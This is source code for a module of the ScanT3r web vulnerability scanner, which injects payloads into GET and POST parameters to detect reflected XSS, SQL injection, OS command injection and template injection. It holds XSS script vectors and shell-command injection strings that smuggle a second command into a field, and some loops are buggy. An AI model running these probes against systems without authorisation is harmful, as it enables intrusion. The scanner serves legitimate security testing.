#!/usr/bin/env python
# ScanT3r Web application Security Scanner - By : Khaled Nassar @knassar702
__author__ = 'Khaled Nassar'
__version__ = '0.1'
__github__ = 'https://github.com/knassar702/scant3r'
__email__ = 'knassar702@gmail.com'

import requests,time,sys,os,re,random
from .encoder import urlencoder
from .colors import *
from .config import *
from .reporter import make_report

errors = {'sqlite3':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'unkown' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found','internal server':'The page cannot be displayed because an internal server error has occurred.','Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application'}
def uagent():
	agents=[
	'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
	'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7',
	'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1'
	]
	return random.choice(agents).encode('utf-8')

class from_url_get:
	def __init__(slef):
		pass
	def xss(slef,url,co,tim,deco):
		deco = deco - 1
		if '*' in url:
			print (end)
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			for payload in payloads:
				payload2=urlencoder(payload)
				for i in range(deco):
					payload2=urlencoder(payload2)
				if co:
					r=requests.get(url.replace('*',payload2),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir)
				else:
					r=requests.get(url.replace('*',payload2),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir)
				if payload.encode('utf-8') in r.content:
					j=url.replace('*',payload2)
					print(f"""
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Exploit : {j}""")
					break
		elif '*' not in url:
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			for params in url.split("?")[1].split("&"):
				for payload in payloads:
					payload2=urlencoder(payload)
					for i in range(deco):
						payload2=urlencoder(payload2)
					if co:
						r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir)
					else:
						r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir)
					if payload.encode('utf-8') in r.content:
						j=url.replace(params, params + str(payload2).strip())
						print(f"""
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Param : {params}
{info}{bold} Exploit : {j}""")
						break
	def xss_post(self,url,co,tim,dat):
		ok = False
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',"<img src='x' onerror='alert(1)'>"]
			for payload in payloads:
					for i,c in dat.items():
						dat[i] = c.replace('*',payload)
					if tim:
						if co:
							r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
						else:
							r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						if co:
							r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
						else:
							r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
					if payload.encode('utf-8') in r.content:
						print(f"""
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
						for i,c in dat.items():
							dat[i] = c.replace(payload,'*')
						break
					else:
						for i,c in dat.items():
							dat[i] = c.replace(payload,'*')
						continue
		else:
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',"<img src='x' onerror='alert(1)'>"]
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c + payload
				if tim:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
				else:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
				if payload.encode('utf-8') in r.content:
					print(f"""
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}{bold}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					for i,c in dat.items():
						dat[i] = c.replace(payload,'')
					break
				else:
					for i,c in dat.items():
						dat[i] = c.replace(payload,'')
					continue
	def sqli_post(self,url,co,tim,dat):
		ok = False
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payload="""'"\\//"""
			for i,d in dat.items():
				dat[i] = d.replace('*',payload)
			if tim:
				if co:
					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
				else:
					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
			else:
				if co:
					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
				else:
					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > 0:
					print(f"""
{bold}{good}{bold} Bug Found : SQL injection
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}{bold}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					break
			for i,d in dat.items():
				dat[i] = d.replace(payload,'*')
		else:
			payload="""'"\\//"""
			for i,d in dat.items():
				dat[i] = d + payload
			if tim:
				if co:
					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
				else:
					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
			else:
				if co:
					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
				else:
					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > 0:
					print(f"""
{bold}{good}{bold} Bug Found : SQL injection
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					break
			for i,d in dat.items():
				dat[i] = d.replace(payload,'')
	def osinj_post(self,url,co,tim,dat):
		ok = False
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payloads=["; 'echo Command Injection (ScanT3r)' | base64 ;",'''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''']
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c.replace('*',payload)
				if tim:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
				else:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
				if 'Q29tbWFuZCBJbmplY3Rpb24gfHwgU2NhblQzcg=='.encode('utf-8') in r.content or 'Q29tbWFuZCBJbmplY3Rpb24gKFNjYW5UM3IpCg=='.encode('utf-8') in r.content:
					print(f"""
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					for i,d in dat.items():
						dat[i] = d.replace(payload,'*')
					break
				else:
					for i,d in dat.items():
						dat[i] = d.replace(payload,'*')
					continue
		else:
			payloads=["; 'echo Command Injection (ScanT3r)' | base64 ;",'''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''']
			for payload in payloads:
				for i,d in dat.items():
					dat[i] = d + payload
				if tim:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
				else:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
				if 'Q29tbWFuZCBJbmplY3Rpb24gfHwgU2NhblQzcg=='.encode('utf-8') in r.content or 'Q29tbWFuZCBJbmplY3Rpb24gKFNjYW5UM3IpCg=='.encode('utf-8') in r.content:
					print(f"""
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					for i,d in dat.items():
						dat[i] = d.replace(payload,'')
					break
				else:
					for i,d in dat.items():
						dat[i] = d.replace(payload,'')
					continue
	def ssti_post(self,url,co,tim,dat):
		ok = False
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}','<%= 15279729727952579217591275217927272761 * 151723272727272725159151516565156 %>','${15279729727952579217591275217927272761*151723272727272725159151516565156}']
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c.replace('*',payload)
				if tim:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
				else:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
					print(f"""
{bold}{good}{bold} Bug Found : Template injection (SSTI)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {url}""")
					for i,d in dat.items():
						dat[i] = i.replace(payload,'*')
					break
				else:
					for i,d in dat.items():
						dat[i] = i.replace(payload,'*')
					continue
		else:
			payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}','<%= 15279729727952579217591275217927272761 * 151723272727272725159151516565156 %>','${15279729727952579217591275217927272761*151723272727272725159151516565156}']
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c + payload
				if tim:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
				else:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
					print(f"""
{bold}{good}{bold} Bug Found : Template injection (SSTI)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {url}""")
					for i,d in dat.items():
						dat[i] = i.replace(payload,'')
					break
				else:
					for i,d in dat.items():
						dat[i] = i.replace(payload,'')
					continue
	def sqli(self,url,co,tim,deco):
		deco = deco - 1
		if '*' in url:
			payload="""'"\\//"""
			payload=urlencoder(payload)
			for i in range(deco):
				payload=urlencoder(payload)
			if tim:
				if co:
					r=requests.get(url.replace('*',payload.strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
				else:
					r=requests.get(url.replace('*',payload.strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir,timeout=tim)
			else:
				if co:
					r=requests.get(url.replace('*',payload.strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir)
				else:
					r=requests.get(url.replace('*',payload.strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir)
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > 0:
					j=url.replace('*',payload.strip())
					print(f"""

{bold}{good}{bold} Bug Found : SQL Injection
{bold}{info}{bold} Payload : "
{info}{bold} Exploit : {j}
                                """)
					break
		elif '*' not in url:
			for params in url.split("?")[1].split("&"):
				payload="""'"\\//"""
				payload=urlencoder(payload)
				for h in range(deco):
					payload=urlencoder(payload)
				for d,i in errors.items():
					if tim:
						if co:
							r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
						else:
							r = requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir,timeout=tim)
					else:
						if co:
							r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir)
						else:
							r = requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir)
					ch = re.findall(i.encode('utf-8'),r.content)
					if len(ch) > 0:
						j=url.replace(params, params + str(payload).strip())
						print(f"""
{bold}{good}{bold} Bug Found : SQL Injection
{bold}{info}{bold} Payload : "
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}
				""")
						break
	def osinj(self,url,co,tim,deco):
		deco = deco - 1
		if '*' in url:
			payloads=["; echo 'Command Injection (ScanT3r)' | base64 ;",'''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''']
			for payload in payloads:
				for h in range(deco):
					payload2=urlencoder(payload)
				if tim:
					if co:
						r=requests.get(url.replace('*',str(payload2).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						r=requests.get(url.replace('*',str(payload2).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir,timeout=tim)
				else:
					if co:
						r=requests.get(url.replace('*',str(payload2).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir)
					else:
						r=requests.get(url.replace('*',str(payload2).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir)
				if 'Q29tbWFuZCBJbmplY3Rpb24gfHwgU2NhblQzcg=='.encode('utf-8') in r.content or 'Q29tbWFuZCBJbmplY3Rpb24gKFNjYW5UM3IpCg=='.encode('utf-8') in r.content:
					j=url.replace('*',payload2.strip())
					print (f"""

{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Exploit : {j}
				""")
					break
		for params in url.split("?")[1].split("&"):
			payloads=["; echo 'Command Injection (ScanT3r)' | base64 ;",'''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print m" ;''']
			for payload in payloads:
				for h in range(deco):
					payload=urlencoder(payload)
				if tim:
					if co:
						r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir,timeout=tim)
				else:
					if co:
						r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir)
					else:
						r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir)
				if 'Q29tbWFuZCBJbmplY3Rpb24gfHwgU2NhblQzcg=='.encode('utf-8') in r.content or 'Q29tbWFuZCBJbmplY3Rpb24gKFNjYW5UM3IpCg=='.encode('utf-8') in r.content:
					j=url.replace(params, params + str(payload).strip())
					print (f"""
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}
				""")
					break
	def ssti(self,url,co,tim,deco):
		if '*' in url:
			payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}','<%= 15279729727952579217591275217927272761 * 151723272727272725159151516565156 %>','${15279729727952579217591275217927272761*151723272727272725159151516565156}']
			for payload in payloads:
				for h in range(deco):
					payload2=urlencoder(payload)
				if tim:
					if co:
						r=requests.get(url.replace('*',str(payload2).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					else:
						r=requests.get(url.replace('*',str(payload2).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir,timeout=tim)
				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
					j=url.replace('*',str(payload2).strip())
					print (f"""
{bold}{good}{bold} Bug Found : Template Injection
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Exploit : {j}""")
					break
		elif '*' not in url:
			for params in url.split("?")[1].split("&"):
				payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}','<%= 15279729727952579217591275217927272761 * 151723272727272725159151516565156 %>','${15279729727952579217591275217927272761*151723272727272725159151516565156}']
				for payload in payloads:
					for h in range(deco):
						payload2=urlencoder(payload)
					if tim:
						if co:
							r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
						else:
							r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir,timeout=tim)
					else:
						if co:
							r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir)
						else:
							r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent()},verify=vert,allow_redirects=redir)
					if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
						j=url.replace(params, params + str(payload2).strip())
						print (f"""
{bold}{good}{bold} Bug Found : Template Injection
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}
				""")
						break